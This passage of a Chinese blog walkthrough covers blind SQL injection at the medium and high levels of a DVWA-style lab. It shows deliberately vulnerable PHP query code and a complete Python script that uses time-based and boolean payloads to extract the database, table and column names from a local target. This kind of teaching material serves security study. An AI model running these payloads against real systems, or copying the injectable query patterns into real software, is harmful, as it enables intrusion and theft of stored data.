+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">	$id=$_POST[&apos;id&apos;];</span><br><span class="line">	$id=mysql_real_escape_string($id);</span><br><span class="line">	$sql=&quot;SELECT first_name,last_name FROM users where user_id=$id&quot;;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	$row=mysql_fetch_array($result);</span><br><span class="line">	if($row)&#123;</span><br><span class="line">		echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>跟之前关卡区别只在于id未被引号包裹，稍微修改一下注入语句，跟之前关卡没什么区别，这里就不贴脚本了，参考上面的代码即可</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_SESSION[&apos;id&apos;]))&#123;</span><br><span class="line">	$id=$_SESSION[&apos;id&apos;];</span><br><span class="line">	$sql=&quot;SELECT first_name , last_name FROM users where user_id=&apos;$id&apos;&quot;;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	$row=mysql_fetch_array($result);</span><br><span class="line">	if($row)&#123;</span><br><span class="line">		echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>有两个页面，一个页面用来接收post的id值并赋值给session的id值，主页面接受session的id值进行查询</p>
+<p>这里的脚本需要特别注意一点，因为是两个页面，所以要把post的数据提交给input页面，然后再访问index主页面，这就需要利用到requests库的Session对象</p>
+<p>以获取数据库名长度为例子说明：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>先创建一个Session对象，利用该对象将数据post到input页面，然后再通过Session对象访问index页面</p>
+<p>其他的改法类似，就不一一赘述了</p>
+<p>下面贴上本关完整脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url_input=<span class="string">"http://127.0.0.1/demo/session-input.php"</span></span><br><span class="line">url_index=<span class="string">"http://127.0.0.1/demo/sqli(blind)-high.php"</span></span><br><span class="line"></span><br><span class="line">database_length=<span class="number">0</span></span><br><span class="line">table_length=<span class="number">0</span></span><br><span class="line">column_length=<span class="number">0</span></span><br><span class="line">database=<span class="string">''</span></span><br><span class="line">table_name=<span class="string">''</span></span><br><span class="line">column_name=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库长度:4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名:dvwa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        s=requests.Session()</span><br><span class="line">        s.post(url_input,data=data)</span><br><span class="line">        r=s.get(url_index)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表总长度:15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">16</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    print(t)</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        table_length=i</span><br><span class="line">        print(<span class="string">'The length of table is:'</span>,table_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表名:guestbook,users</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        s=requests.Session()</span><br><span class="line">        s.post(url_input,data=data)</span><br><span class="line">        r=s.get(url_index)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is:'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">3</span>):</span><br><span class="line">            table_name=table_name+chr(j)</span><br><span class="line">            print(<span class="string">'The name of table is:'</span>,table_name)</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                table_name=table_name+<span class="string">','</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列总长度:94</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">100</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        column_length=i</span><br><span class="line">        print(column_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列名:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        s=requests.Session()</span><br><span class="line">        s.post(url_input,data=data)</span><br><span class="line">        r=s.get(url_index)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            column_name=column_name+chr(j)</span><br><span class="line">            print(<span class="string">"The name of column is:"</span>,column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                column_name=column_name+<span class="string">','</span></span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2018-07-11T10:36:59.664Z" itemprop="dateUpdated">2018-07-11 18:36:59</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/55409/" target="_blank" rel="external">https://Foxgrin.github.io/posts/55409/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/55409/&title=《dvwa-sql(blind)》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/55409/&title=《dvwa-sql(blind)》 — Somnus's blog&source=总结了dvwa中的sql盲注关卡" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/55409/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《dvwa-sql(blind)》 — Somnus's blog&url=https://Foxgrin.github.io/posts/55409/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/55409/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/52787/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：dvwa-xss(reflected)
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/39291/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：dvwa-sql">下一篇：dvwa-sql</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/55409/&title=《dvwa-sql(blind)》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/55409/&title=《dvwa-sql(blind)》 — Somnus's blog&source=总结了dvwa中的sql盲注关卡" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/55409/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《dvwa-sql(blind)》 — Somnus's blog&url=https://Foxgrin.github.io/posts/55409/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/55409/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABvklEQVR42u3aS27DMAwFQN//0i7QVTcRHklLMYrRykhie5QFwY+uK17371p/fv9Zn+5af/vYwsXFHXPv5VpT1tuo0tcGXFzc89xekMoDU+9eXFzc93PX4a+6SVxc3P/HXb9+sklcXNz3cJPiJ/l9UsAkAe6BWg0XF3fArTZMd1xv7O/i4uIWuU8Fo2qK03w7Li7uEe6kIMnbo70QVsjIcHFxH+XOQ1VOzLdaSHFwcXG3cavpSNTWLB7aSMYtuLi43+VWD1Xk947Grri4uEe4vXSnF6rysWvhn8bFxd3AnQw7k6Kod9dVjZq4uLibuUlJ00tfJikRLi7uSW5v/Fltj1YHKlGYw8XF3catHpR8ir6+joofXFzcbdzeILbXIpmPbHFxcc9wk9dXRyDzJ3wMYbi4uF/i5o/rpUG91gkuLu5Jbm9aMS9s5nMTXFzcfdy7uKq7T74tJE+4uLhHuNXmSDVUVUujh3s5uLi4A24+Us0PWiX/SrUcwsXFPc+dBK/82NY8dOLi4r6N29vAPV5RkoaLi/sCbvVcRPUwVhThcHFxN3OrA9d5opM3TXBxcc9zdzRMq+GsF2pxcXE3cH8AyRgp+CAq9boAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
